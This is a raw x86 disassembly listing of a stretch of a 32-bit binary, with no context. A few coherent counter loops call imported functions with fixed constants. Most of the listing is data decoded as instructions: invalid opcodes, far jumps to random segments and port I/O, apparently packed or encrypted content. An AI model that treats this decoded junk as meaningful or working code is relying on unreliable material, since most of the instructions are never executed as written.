  40ac31:	pop    esp
  40ac32:	xchg   DWORD PTR [eax-0x54],eax
  40ac35:	inc    esi
  40ac36:	sub    DWORD PTR [eax+0x24],ebx
  40ac39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac3a:	mov    edi,0xe11e5b61
  40ac3f:	add    al,0x36
  40ac41:	jae    0x40ac22
  40ac43:	mov    ?,WORD PTR [ebp-0x60]
  40ac46:	and    BYTE PTR [edi-0x73485c0b],bl
  40ac4c:	jl     0x40ac15
  40ac4e:	sahf   
  40ac4f:	ins    BYTE PTR es:[edi],dx
  40ac50:	sbb    cx,WORD PTR [eax-0x4850659f]
  40ac57:	jle    0x40aca9
  40ac59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac5a:	sbb    eax,0x3d6aa7f8
  40ac5f:	arpl   WORD PTR [esi-0x9],dx
  40ac62:	cmp    BYTE PTR [ebp+0x2d],ch
  40ac65:	jge    0x40ac3c
  40ac67:	adc    al,0x30
  40ac69:	popf   
  40ac6a:	add    ch,BYTE PTR [eax+0x49]
  40ac6d:	leave  
  40ac6e:	inc    esp
  40ac6f:	scas   al,BYTE PTR es:[edi]
  40ac70:	mov    WORD PTR [eax],ss
  40ac72:	add    DWORD PTR [ecx-0x6b],0xffffffbb
  40ac76:	in     al,dx
  40ac77:	and    bh,BYTE PTR [edi+0x30849ba]
  40ac7d:	mov    cl,0xdb
  40ac7f:	adc    cl,BYTE PTR ds:0x39a93fba
  40ac85:	sar    BYTE PTR [ebx],1
  40ac87:	enter  0x840f,0x5f
  40ac8b:	or     eax,0x1d810000
  40ac90:	imul   esi,DWORD PTR [esi],0x43
  40ac93:	add    BYTE PTR [ebx],dl
  40ac95:	je     0x40ac97
  40ac97:	add    BYTE PTR [ebx+0x2581ec45],cl
  40ac9d:	out    dx,eax
  40ac9e:	ss inc ebx
  40aca0:	add    BYTE PTR [eax],al
  40aca2:	add    BYTE PTR [eax],al
  40aca4:	add    BYTE PTR [ebx],dh
  40aca6:	leave  
  40aca7:	or     ecx,DWORD PTR ds:0x4336ef
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x4336ef,ecx
  40acb4:	cmp    DWORD PTR ds:0x4336ef,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433788
  40acc6:	push   0x4337cc
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x4336ef,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi+0x2cf8580],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40ad33
  40ad2c:	out    0x62,eax
  40ad2e:	aam    0x5a
  40ad30:	int    0x5f
  40ad32:	sahf   
  40ad33:	repz pop edx
  40ad35:	mov    ch,0x2d
  40ad37:	fiadd  WORD PTR [edi]
  40ad39:	or     BYTE PTR [ebx-0x7d],bh
  40ad3c:	and    dh,ah
  40ad3e:	adc    al,0xbe
  40ad40:	cmp    BYTE PTR [esi],bl
  40ad42:	mov    WORD PTR [ebx-0x11],cs
  40ad45:	mov    BYTE PTR [edx+0x1209b437],cl
  40ad4b:	xor    al,0xc
  40ad4d:	fld    DWORD PTR [edx-0x17]
  40ad50:	xchg   edi,eax
  40ad51:	sbb    ecx,DWORD PTR [edi]
  40ad53:	add    al,0x72
  40ad55:	xchg   edx,eax
  40ad56:	out    0x83,al
  40ad58:	mov    ah,0x61
  40ad5a:	pop    esp
  40ad5b:	fs add eax,0x7f04c7f
  40ad61:	sti    
  40ad62:	retf   
  40ad63:	push   ecx
  40ad64:	push   es
  40ad65:	in     eax,dx
  40ad66:	mov    ch,0x86
  40ad68:	xor    eax,DWORD PTR [edx+0x46]
  40ad6b:	clc    
  40ad6c:	lea    edx,[eax]
  40ad6e:	or     cl,bl
  40ad70:	jl     0x40aded
  40ad72:	adc    edx,DWORD PTR [ebx]
  40ad74:	jge    0x40add2
  40ad76:	mov    ss,esi
  40ad78:	mov    ecx,0x90503e89
  40ad7d:	ins    BYTE PTR es:[edi],dx
  40ad7e:	jmp    0x618d71f1
  40ad83:	inc    esp
  40ad84:	imul   esp,DWORD PTR [edi+ecx*2],0x8e9cd71a
  40ad8b:	and    DWORD PTR [eax-0x60538e45],esp
  40ad91:	adc    cl,dl
  40ad93:	or     al,0x84
  40ad95:	dec    esi
  40ad96:	aam    0x80
  40ad98:	sbb    edi,DWORD PTR [eax+0x5e]
  40ad9b:	rol    DWORD PTR [edx],0xf2
  40ad9e:	call   0x14ea:0x7c95273
  40ada5:	mov    ch,BYTE PTR [eax+0x7a69d086]
  40adab:	inc    ebx
  40adac:	fwait
  40adad:	out    dx,eax
  40adae:	in     al,dx
  40adaf:	ret    
  40adb0:	imul   esp,DWORD PTR [ebx+esi*8],0xffffff95
  40adb4:	or     eax,0xd933bf90
  40adb9:	xchg   ecx,eax
  40adba:	clc    
  40adbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adbc:	(bad)  
  40adbd:	dec    ebx
  40adbe:	stos   DWORD PTR es:[edi],eax
  40adbf:	xadd   BYTE PTR [ecx+0x1],ch
  40adc3:	stc    
  40adc4:	cs jnp 0x40ad9c
  40adc7:	xchg   BYTE PTR [edx+0x6d],bh
  40adca:	in     eax,dx
  40adcb:	xchg   DWORD PTR [edx-0x74],esp
  40adce:	add    DWORD PTR [esi+0x4f],0xffffff83
  40add2:	push   esp
  40add3:	call   0x7808:0x9ea39c0a
  40adda:	in     al,0xc
  40addc:	mov    esi,esi
  40adde:	jp     0x40adce
  40ade0:	sbb    BYTE PTR [edx-0x2],ah
  40ade3:	inc    edi
  40ade4:	pushf  
  40ade5:	call   0xa771:0xca59c7a1
  40adec:	scas   al,BYTE PTR es:[edi]
  40aded:	push   0x408d261c
  40adf2:	or     al,0xfd
  40adf4:	jg     0x40aded
  40adf6:	adc    ebp,DWORD PTR [esi+0x1cd1811f]
  40adfc:	rol    BYTE PTR fs:[edi+0x59ddd5db],1
  40ae03:	mov    ds:0x1ac503ef,eax
  40ae08:	add    BYTE PTR [ebx+0x29],dh
  40ae0b:	loopne 0x40adfb
  40ae0d:	xlat   BYTE PTR ds:[ebx]
  40ae0e:	ss lock xchg edi,eax
  40ae11:	(bad)  
  40ae12:	sub    eax,0xa7168268
  40ae17:	(bad)  
  40ae18:	out    0xdc,eax
  40ae1a:	cmc    
  40ae1b:	inc    edx
  40ae1c:	je     0x40adad
  40ae1e:	jle    0x40adaf
  40ae20:	cmp    BYTE PTR [edx+0x6e],bl
  40ae23:	(bad)
  40ae26:	add    al,BYTE PTR [eax+0x5adebcc4]
  40ae2c:	add    eax,0x3cd68b60
  40ae31:	in     al,0xe4
  40ae33:	and    esi,DWORD PTR [eax+0x2f]
  40ae36:	xor    dh,BYTE PTR [ecx]
  40ae38:	push   esp
  40ae39:	in     eax,dx
  40ae3a:	jg     0x40addd
  40ae3c:	push   0xffffffbf
  40ae3e:	mov    esi,0x39f0a7c1
  40ae43:	add    DWORD PTR [ecx],ecx
  40ae45:	push   ds
  40ae46:	imul   esp,DWORD PTR [edx],0x17
  40ae49:	jecxz  0x40ae49
  40ae4b:	mov    edi,0x14abf614
  40ae50:	push   edi
  40ae51:	cmp    ecx,DWORD PTR [ebx]
  40ae53:	sbb    bl,BYTE PTR [ebx-0x2b]
  40ae56:	enter  0xe8bd,0x9d
  40ae5a:	and    BYTE PTR [bx-0x17],ah
  40ae5e:	(bad)  
  40ae5f:	xchg   edi,eax
  40ae60:	das    
  40ae61:	das    
  40ae62:	or     eax,0xc3d4443b
  40ae67:	xchg   esp,eax
  40ae68:	mov    ds:0x428e0615,al
  40ae6d:	jmp    0x9d41:0xad760d7d
  40ae74:	jge    0x40ae86
  40ae76:	jl     0x40ae45
  40ae78:	or     BYTE PTR [edx-0x657067ae],dh
  40ae7e:	xchg   ebx,eax
  40ae7f:	adc    al,0x72
  40ae81:	mov    cl,0x8f
  40ae83:	test   eax,0x5c132de0
  40ae88:	mov    BYTE PTR [edi],bl
  40ae8a:	and    esi,DWORD PTR ds:0xa5093ecd
  40ae90:	iret   
  40ae91:	in     eax,dx
  40ae92:	mov    DWORD PTR [ecx-0x345f0e52],ecx
  40ae98:	adc    al,0x6c
  40ae9a:	mul    BYTE PTR [eax-0x2cef2388]
  40aea0:	mov    edi,0x65fd1560
  40aea5:	jmp    0x8864:0x6c6baadc
  40aeac:	mov    ah,0xec
  40aeae:	lds    edx,FWORD PTR [ebx-0x7bda4031]
  40aeb4:	dec    ebx
  40aeb5:	dec    ecx
  40aeb6:	outs   dx,BYTE PTR ds:[esi]
  40aeb7:	mov    WORD PTR [edi-0x13528a51],fs
  40aebd:	mov    ch,0xb3
  40aebf:	dec    esp
  40aec0:	mov    eax,ds:0x2f84fb35
  40aec5:	(bad)  [ecx-0x11]
  40aec8:	gs push ebp
  40aeca:	sub    dl,BYTE PTR [eax-0x69]
  40aecd:	mov    eax,0x1a59de57
  40aed2:	push   eax
  40aed3:	mov    ecx,0x363f3b5d
  40aed8:	dec    ecx
  40aed9:	ins    DWORD PTR es:[edi],dx
  40aeda:	mov    esi,eax
  40aedc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aedd:	or     edx,DWORD PTR [ebx-0xc733c7e]
  40aee3:	mov    esi,0x34012f87
  40aee8:	stos   BYTE PTR es:[edi],al
  40aee9:	or     DWORD PTR [edx],0xb49d1394
  40aeef:	and    eax,0xb82d5af1
  40aef4:	fldcw  WORD PTR gs:[edi]
  40aef7:	inc    esi
  40aef8:	fcomp  QWORD PTR ds:0xfcc43747
  40aefe:	sbb    esp,DWORD PTR [edx-0x39]
  40af01:	inc    ebp
  40af02:	xchg   esi,eax
  40af03:	bound  eax,QWORD PTR [ebp+0x2a]
  40af06:	sub    al,0x99
  40af08:	xchg   edi,eax
  40af09:	push   esi
  40af0a:	stos   BYTE PTR es:[edi],al
  40af0b:	cmc    
  40af0c:	(bad)
  40af0f:	repnz adc esp,edx
  40af12:	ret    0xde57
  40af15:	sbb    eax,0xc402bab4
  40af1a:	(bad)  
  40af1b:	push   edx
  40af1d:	into   
  40af1e:	mov    edx,0xf4bb9845
  40af23:	and    DWORD PTR [edx+0x62],ebx
  40af26:	add    BYTE PTR [ebx-0x49],dh
  40af29:	add    al,0x89
  40af2b:	(bad)  
  40af2c:	mov    ecx,0xde8d5166
  40af31:	xchg   edi,ebp
  40af33:	sub    DWORD PTR [ebx],edx
  40af35:	adc    esi,DWORD PTR [ebp+0x7]
  40af38:	fidiv  WORD PTR [ebx+0xb16b8e2]
  40af3e:	pop    ecx
  40af3f:	nop
  40af40:	jbe    0x40af06
  40af42:	aam    0x40
  40af44:	dec    ebp
  40af45:	inc    esi
  40af46:	ss leave 
  40af48:	mov    ds:0xe508504,eax
  40af4d:	adc    eax,0xae465473
  40af52:	sub    ah,cl
  40af54:	or     bl,BYTE PTR [esi+0x3a]
  40af57:	cs pop esp
  40af59:	or     bl,ch
  40af5b:	dec    esp
  40af5c:	loope  0x40af6e
  40af5e:	dec    eax
  40af5f:	fidiv  WORD PTR [edx+0x6c]
  40af62:	adc    edi,DWORD PTR [ebx-0x23]
  40af65:	pushf  
  40af66:	into   
  40af67:	leave  
  40af68:	fsub   QWORD PTR [edi-0x57e87be4]
  40af6e:	leave  
  40af6f:	jo     0x40afbf
  40af71:	mov    eax,DWORD PTR [eax+0x18]
  40af74:	or     ecx,0x7018
  40af7a:	mov    DWORD PTR [ebp-0x20],eax
  40af7d:	mov    eax,DWORD PTR [ebp-0x14]
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	jg     0x40afcc
  40b019:	loope  0x40affa
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	pop    ebp
  40b024:	cmp    DWORD PTR gs:[esi],ebx
  40b027:	xchg   ebp,eax
  40b028:	sbb    DWORD PTR [edx],0x34aa3d80
  40b02e:	push   esp
  40b02f:	call   0xe0a5:0xbe4de3e7
  40b036:	pop    esi
  40b037:	xchg   edx,eax
  40b038:	jno    0x40afc0
  40b03a:	aaa    
  40b03b:	ja     0x40b079
  40b03d:	pop    ecx
  40b03e:	iret   
  40b03f:	mov    ecx,0x68b1ada4
  40b044:	xor    ebp,ebp
  40b046:	sar    edx,cl
  40b048:	sbb    edx,DWORD PTR [edx+0x27]
  40b04b:	js     0x40b05f
  40b04d:	sbb    DWORD PTR [ecx+ebx*1+0x6d5a2f23],ecx
  40b054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b055:	(bad)  
  40b056:	or     DWORD PTR [eax-0x1915b141],esi
  40b05c:	pop    ebp
  40b05d:	repz mov esp,0xd1085a77
  40b063:	mov    edi,eax
  40b065:	in     al,0x73
  40b067:	and    DWORD PTR [ebp+eax*2-0x4e],esp
  40b06b:	mov    ebp,0xba599a1f
  40b070:	scas   eax,DWORD PTR es:[edi]
  40b071:	push   esi
  40b072:	and    eax,0xf8c23cde
  40b077:	cmp    cl,BYTE PTR [edx]
  40b079:	xor    ch,BYTE PTR [ebx+0x61f20fb0]
  40b07f:	les    edx,FWORD PTR [edi+0x759edf83]
  40b085:	or     al,0x7a
  40b087:	sbb    DWORD PTR [ebp+edx*1-0x79],esi
  40b08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b08c:	mov    esi,0xd5948ca1
  40b091:	pushf  
  40b092:	(bad)  
  40b093:	(bad)  
  40b094:	and    edi,DWORD PTR [edx-0x39]
  40b097:	sbb    eax,0x5aba238b
  40b09c:	pop    ecx
  40b09d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b09e:	mov    bh,0xa2
  40b0a0:	test   al,0xaa
  40b0a2:	dec    edi
  40b0a3:	xor    DWORD PTR [eax],eax
  40b0a5:	dec    esp
  40b0a6:	push   es
  40b0a7:	rcr    DWORD PTR [ebx+0x32109875],cl
  40b0ad:	leave  
  40b0ae:	ss leave 
  40b0b0:	adc    eax,0xc44b06e9
  40b0b5:	arpl   ax,bx
  40b0b7:	das    
  40b0b8:	xor    edx,ebp
  40b0ba:	push   ebp
  40b0bb:	dec    ebp
  40b0bc:	push   ebp
  40b0bd:	jp     0x40b05a
  40b0bf:	bound  esp,QWORD PTR [edi-0x72951da3]
  40b0c5:	and    ah,BYTE PTR [ecx+0x65b5ded]
  40b0cb:	ins    DWORD PTR es:[edi],dx
  40b0cc:	loope  0x40b12c
  40b0ce:	loopne 0x40b134
  40b0d0:	dec    ebp
  40b0d1:	adc    DWORD PTR [ebp-0x505f1353],0xffffffa6
  40b0d8:	cli    
  40b0d9:	je     0x40b0e1
  40b0db:	ds scas eax,DWORD PTR es:[edi]
  40b0dd:	push   esp
  40b0de:	ds cmp al,0x4e
  40b0e1:	sub    ch,BYTE PTR [edx]
  40b0e3:	cmp    ah,dl
  40b0e5:	mov    WORD PTR [ebx-0x77],?
  40b0e8:	scas   eax,DWORD PTR es:[edi]
  40b0e9:	mov    dl,0xc5
  40b0eb:	retf   0xa52d
  40b0ee:	xchg   edi,eax
  40b0ef:	stos   BYTE PTR es:[edi],al
  40b0f0:	loope  0x40b141
  40b0f2:	mov    dh,0xa
  40b0f4:	mov    ch,bl
  40b0f6:	out    dx,eax
  40b0f7:	fs dec esp
  40b0f9:	ins    DWORD PTR es:[edi],dx
  40b0fa:	out    0x36,al
  40b0fc:	add    bl,al
  40b0fe:	aas    
  40b0ff:	xor    al,0xa9
  40b101:	inc    ecx
  40b102:	and    BYTE PTR [edx-0x1a9bea72],dh
  40b108:	fdiv   DWORD PTR [ecx+0x2]
  40b10b:	sub    BYTE PTR [ebx+0x78],al
  40b10e:	mov    DWORD PTR [edi+esi*2+0x3d],ecx
  40b112:	test   eax,0x3801ce11
  40b117:	fsubr  DWORD PTR [eax]
  40b119:	jnp    0x40b0b6
  40b11b:	cmp    dh,BYTE PTR [ebx]
  40b11d:	cmp    BYTE PTR [esp+ecx*4-0x2],bh
  40b121:	mov    ch,0x9e
  40b123:	mov    cl,0x9d
  40b125:	push   esi
  40b126:	ins    BYTE PTR es:[edi],dx
  40b127:	mov    DWORD PTR [edx-0x5ad7c26a],0xeb73ec19
  40b131:	pop    esp
  40b132:	shl    DWORD PTR [edx-0x7183731a],0xb7
  40b139:	pop    ebx
  40b13a:	cmp    ah,al
  40b13c:	lahf   
  40b13d:	lds    ecx,FWORD PTR [ebp-0x2]
  40b140:	ficomp DWORD PTR [ebx]
  40b142:	or     al,0x68
  40b144:	daa    
  40b145:	stos   DWORD PTR es:[edi],eax
  40b146:	jae    0x40b1c5
  40b148:	fmul   DWORD PTR [edi-0x6c]
  40b14b:	pop    eax
  40b14c:	iret   
  40b14d:	js     0x40b174
  40b14f:	ja     0x40b1bd
  40b151:	in     eax,0x8d
  40b153:	dec    ebx
  40b154:	inc    ecx
  40b155:	test   edi,ebx
  40b157:	push   0x3223be11
  40b15c:	push   ds
  40b15d:	pop    ecx
  40b15e:	loope  0x40b1d0
  40b160:	push   ebx
  40b161:	clc    
  40b162:	dec    DWORD PTR [esi+ebx*1-0x252de780]
  40b169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b16a:	inc    edx
  40b16b:	and    al,BYTE PTR [edx]
  40b16d:	and    ah,BYTE PTR [ecx-0x5d5be116]
  40b173:	push   ebx
  40b174:	xchg   edx,eax
  40b175:	fdivr  st(4),st
  40b177:	xchg   ebp,eax
  40b178:	push   esp
  40b179:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b17a:	loop   0x40b19c
  40b17c:	sbb    al,0x9
  40b17e:	sub    al,0x72
  40b180:	fidiv  WORD PTR [edi+0x49]
  40b183:	out    dx,al
  40b184:	cli    
  40b185:	adc    ebp,DWORD PTR [eax]
  40b187:	adc    eax,0x8ab5beed
  40b18c:	stc    
  40b18d:	sar    DWORD PTR [ebp-0x1],1
  40b190:	idiv   DWORD PTR [eax]
  40b192:	(bad)  
  40b193:	jp     0x40b1c1
  40b195:	or     BYTE PTR [ebx+0x22ba6242],ah
  40b19b:	fisttp DWORD PTR [ecx+eiz*4+0x5a]
  40b19f:	jl     0x40b168
  40b1a1:	or     ebx,esi
  40b1a3:	sub    al,BYTE PTR [ebx]
  40b1a5:	in     al,0xc6
  40b1a7:	sbb    bl,bl
  40b1a9:	outs   dx,BYTE PTR ds:[esi]
  40b1aa:	sbb    BYTE PTR [ebp+0x19],dl
  40b1ad:	ret    0xae3
  40b1b0:	jno    0x40b15d
  40b1b2:	dec    esi
  40b1b3:	cmc    
  40b1b4:	mov    al,0xaa
  40b1b6:	mov    bl,0xfa
  40b1b8:	or     BYTE PTR ds:0xc000cfa,al
  40b1be:	mov    cl,0xb2
  40b1c0:	jnp    0x40b1d1
  40b1c2:	push   eax
  40b1c3:	test   DWORD PTR [edi+0x62a70dd9],ecx
  40b1c9:	out    0x18,eax
  40b1cb:	clc    
  40b1cc:	rep lods al,BYTE PTR ds:[esi]
  40b1ce:	add    al,0xe9
  40b1d0:	int3   
  40b1d1:	adc    BYTE PTR [ebp-0x76],0x51
  40b1d5:	xor    DWORD PTR [ebx+0x200c1ee7],edi
  40b1db:	pop    esi
  40b1dc:	mov    edx,0x583d8dd
  40b1e1:	adc    dl,al
  40b1e3:	scas   eax,DWORD PTR es:[edi]
  40b1e4:	adc    DWORD PTR [edx],esp
  40b1e6:	mov    ebp,0x66132a1a
  40b1eb:	sub    BYTE PTR [edx],0x5d
  40b1ee:	addr16 mov ds:0xd266,al
  40b1f2:	mov    esp,0x70f20db3
  40b1f7:	aad    0x32
  40b1f9:	adc    DWORD PTR [eax],ebp
  40b1fb:	fwait
  40b1fc:	jg     0x40b21a
  40b1fe:	pop    ebp
  40b1ff:	gs or  cl,dh
  40b202:	xchg   ebp,eax
  40b203:	fidiv  WORD PTR ss:[edx+0x1a]
  40b207:	je     0x40b1c8
  40b209:	(bad)  
  40b20a:	fild   WORD PTR [eax-0x47]
  40b20d:	test   al,0xae
  40b20f:	lds    edx,FWORD PTR [ecx+ebp*1-0x4d4f095c]
  40b216:	jl     0x40b1e8
  40b218:	cmp    BYTE PTR [edx+0x136b32df],cl
  40b21e:	das    
  40b21f:	cmp    eax,0x59ed0a6e
  40b224:	jl     0x40b1f1
  40b226:	pop    ds
  40b227:	pop    ss
  40b228:	lea    ebp,[eax]
  40b22a:	fstp   QWORD PTR [ebp+0x72]
  40b22d:	sbb    bl,bl
  40b22f:	add    eax,0x57434739
  40b234:	inc    eax
  40b235:	out    dx,al
  40b236:	push   0xd7e2c1ba
  40b23b:	mov    al,ds:0x972e53bf
  40b240:	and    BYTE PTR [edi],ah
  40b242:	push   esp
  40b243:	jmp    0x40b226
  40b245:	pop    edi
  40b246:	or     ebx,ebx
  40b248:	cli    
  40b249:	xchg   ebx,eax
  40b24a:	xchg   esi,eax
  40b24b:	mov    edx,0x6e78d5a9
  40b250:	sahf   
  40b251:	ror    eax,0xfa
  40b254:	jmp    FWORD PTR [edi-0x57]
  40b257:	repnz (bad) 
  40b25a:	jb     0x40b2b0
  40b25c:	retf   
  40b25d:	push   edx
  40b25e:	push   es
  40b25f:	(bad)  
  40b261:	sub    ebx,edx
  40b263:	lods   eax,DWORD PTR ds:[esi]
  40b264:	js     0x40b1fa
  40b266:	jp     0x40b208
  40b268:	dec    DWORD PTR [ebx+0x4d8bec45]
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	mov    eax,ds:0x2eaab51e
  40b288:	bnd jle 0x40b309
  40b28b:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b28f:	xchg   ecx,eax
  40b290:	add    cl,dh
  40b292:	sti    
  40b293:	adc    al,0x89
  40b295:	outs   dx,DWORD PTR ds:[esi]
  40b296:	mov    cl,0x11
  40b298:	mov    ebx,esi
  40b29a:	xor    dl,al
  40b29c:	pop    esp
  40b29d:	outs   dx,DWORD PTR ds:[esi]
  40b29e:	push   0x24
  40b2a0:	pop    es
  40b2a1:	fstp   QWORD PTR [eax]
  40b2a3:	imul   ebp,DWORD PTR [ecx-0x54bee894],0xffffffc7
  40b2aa:	push   edx
  40b2ab:	adc    edx,edi
  40b2ad:	(bad)  
  40b2ae:	retf   0x4aaa
  40b2b1:	jne    0x40b253
  40b2b3:	test   eax,ebx
  40b2b5:	scas   al,BYTE PTR es:[edi]
  40b2b6:	cmp    bh,BYTE PTR [esp+ecx*8+0x4c8c4de8]
  40b2bd:	push   0xffffffb6
  40b2bf:	scas   eax,DWORD PTR es:[edi]
  40b2c0:	mov    al,ds:0x835e09fb
  40b2c5:	sub    BYTE PTR [esi],ah
  40b2c7:	enter  0xe089,0xc2
  40b2cb:	xor    al,BYTE PTR [edi+0xb]
  40b2ce:	xchg   BYTE PTR [edi+0x1f59761b],cl
  40b2d4:	sbb    ecx,ebp
  40b2d6:	cmp    ah,BYTE PTR [edx+0x18fc27c9]
  40b2dc:	pop    esi
  40b2dd:	lods   al,BYTE PTR ds:[esi]
  40b2de:	jmp    0xca042ec4
  40b2e3:	pop    esi
  40b2e4:	imul   eax,DWORD PTR [ebx+edi*2+0x67],0x1150e8d9
  40b2ec:	das    
  40b2ed:	aas    
  40b2ee:	cwde   
  40b2ef:	(bad)  
  40b2f0:	clc    
  40b2f1:	outs   dx,BYTE PTR ds:[esi]
  40b2f2:	repz lar esp,WORD PTR [ebp-0x4232eff7]
  40b2fa:	mov    BYTE PTR [ecx-0x1cbd8dfa],al
  40b300:	mov    edx,0x6e18504e
  40b305:	adc    esp,DWORD PTR [ecx+0x135492ac]
  40b30b:	mov    ds:0xdca1c63,al
  40b310:	popf   
  40b311:	inc    ebx
  40b312:	setnp  BYTE PTR [ecx]
  40b315:	jo     0x40b304
  40b317:	or     eax,0x484a4ace
  40b31c:	pop    ss
  40b31d:	(bad)  
  40b31e:	jmp    0x7ca1c2d0
  40b323:	sbb    BYTE PTR [esi],al
  40b325:	mov    eax,ds:0xeb9e5120
  40b32a:	fwait
  40b32b:	ss push ss
  40b32d:	jnp    0x40b316
  40b32f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b330:	(bad)  [ebx-0x79]
  40b333:	mov    ebx,0xb6235da8
  40b338:	in     al,0xcd
  40b33a:	cmp    eax,0xf7b92971
  40b33f:	sub    bl,BYTE PTR [ebp-0x78]
  40b342:	adc    bh,BYTE PTR [edi+0x1a045aac]
  40b348:	cdq    
  40b349:	xchg   edi,eax
  40b34a:	mov    WORD PTR [edx+ebp*1+0x24],gs
  40b34e:	cmc    
  40b34f:	fwait
  40b350:	iret   
  40b351:	retf   0xb7cb
  40b354:	cmp    BYTE PTR [bx],ah
  40b357:	in     eax,dx
  40b358:	jne    0x40b309
  40b35a:	or     esp,edi
  40b35c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b35d:	test   ch,ah
  40b35f:	pop    esp
  40b360:	fisttp QWORD PTR [eax-0x18]
  40b363:	xor    al,0x45
  40b365:	xlat   BYTE PTR ds:[ebx]
  40b366:	or     eax,0x9c70ea04
  40b36b:	and    eax,0x86db361d
  40b370:	mov    ss,WORD PTR [ebx]
  40b372:	repnz adc ebp,DWORD PTR [ecx+0x79]
  40b376:	shl    DWORD PTR [edx],0x9e
  40b379:	pusha  
  40b37a:	push   es
  40b37b:	xchg   al,bh
  40b37d:	shl    dl,0x85
  40b380:	scas   al,BYTE PTR es:[edi]
  40b381:	xlat   BYTE PTR ds:[ebx]
  40b382:	sub    esi,edx
  40b384:	mov    dl,0xbc
  40b386:	adc    BYTE PTR [edi-0x26ec937b],ch
  40b38c:	cmp    al,0xa2
  40b38e:	sbb    DWORD PTR [ebx+0x11],esp
  40b391:	adc    BYTE PTR [ebx+0x1bbc28ee],dl
  40b397:	and    eax,0x4583072a
  40b39c:	inc    ebp
  40b39d:	cmp    DWORD PTR [ebx+0x46],esi
  40b3a0:	mov    al,0x2a
  40b3a2:	or     DWORD PTR [edx+edi*1+0x10],esi
  40b3a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3a7:	call   0xfbfe:0x9def4020
  40b3ae:	gs fdivr st(3),st
  40b3b1:	mov    ah,0x28
  40b3b3:	and    dh,cl
  40b3b5:	fldcw  WORD PTR [ecx-0x1c]
  40b3b8:	inc    ecx
  40b3b9:	sbb    DWORD PTR [ebx],0x7c500672
  40b3bf:	and    al,0x74
  40b3c1:	jae    0x40b3bf
  40b3c3:	dec    ebx
  40b3c4:	es es es jnp 0x40b369
  40b3c9:	jge    0x40b37a
  40b3cb:	mov    ebp,esp
  40b3cd:	cwde   
  40b3ce:	in     al,0xb8
  40b3d0:	mov    esi,0xc1b05cb6
  40b3d5:	jg     0x40b3a4
  40b3d7:	int    0x33
  40b3d9:	sbb    al,dl
  40b3db:	stos   DWORD PTR es:[edi],eax
  40b3dc:	(bad)  
  40b3dd:	xchg   ebx,eax
  40b3de:	lea    ecx,[esi]
  40b3e0:	cmp    al,ah
  40b3e2:	sbb    DWORD PTR [esi+0x1c],ebp
  40b3e5:	ja     0x40b382
  40b3e7:	pusha  
  40b3e8:	aad    0x28
  40b3ea:	ins    DWORD PTR es:[edi],dx
  40b3eb:	dec    esi
  40b3ec:	cwde   
  40b3ed:	xchg   esi,eax
  40b3ee:	pop    bx
  40b3f0:	mov    edi,0xafaac59c
  40b3f5:	inc    esi
  40b3f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3f7:	jle    0x40b3f2
